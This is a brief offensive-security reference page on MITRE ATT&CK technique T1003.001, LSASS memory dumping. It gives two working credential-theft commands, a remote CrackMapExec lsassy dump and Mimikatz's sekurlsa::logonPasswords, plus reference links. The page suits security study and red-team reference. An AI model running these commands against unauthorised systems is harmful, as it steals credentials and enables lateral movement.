---
description: MITRE ATT&CK, Credential Access, Sub-technique T1003.001
---

# LSASS Memory

> Adversaries commonly abuse the [Local Security Authority Subsystem Service](https://attack.mitre.org/techniques/T1003/001/) (LSASS) to dump credentials for privilege escalation, data theft, and lateral movement. The process is a fruitful target for adversaries because of the sheer amount of sensitive information it stores in memory.

### Dumping LSASS Memory

```bash
# Dumping LSASS remotely with CrackMapExec
crackmapexec smb $ip -u $username -p $password -M lsassy

# Dumping LSASS with Mimikatz
sekurlsa::logonPasswords
```

### References

{% embed url="https://redcanary.com/threat-detection-report/techniques/lsass-memory/" %}

{% embed url="https://attack.mitre.org/techniques/T1003/001/" %}
